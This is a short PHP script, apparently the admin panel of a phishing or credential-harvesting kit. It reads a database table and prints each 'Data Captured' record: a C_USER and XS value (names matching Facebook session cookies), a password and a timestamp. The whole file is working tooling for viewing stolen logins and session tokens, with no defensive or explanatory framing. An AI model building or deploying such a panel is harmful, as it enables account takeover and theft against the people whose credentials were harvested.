<?php

require __DIR__ . '/database.php';

  $sql =<<<EOF
      SELECT * from DATA;
EOF;

  $ret = pg_query($dbconn, $sql);
  if(!$ret) {
    echo pg_last_error($dbconn);
    exit;
  } 
  while($row = pg_fetch_row($ret)) {
    echo "<p>*********Data Captured**********</p>";
    echo "<p>C_USER = ". $row[1] . "</p>";
    echo "<p>XS = ". $row[2] ."</p>";
    echo "<p>PASSWORD = ". $row[3] ."</p>";
    echo "<p>TIME =  ".$row[4] ."</p>";
    echo "<p>------------------------------</p>";
    echo "<br /> <br />";
  }
  pg_close($dbconn);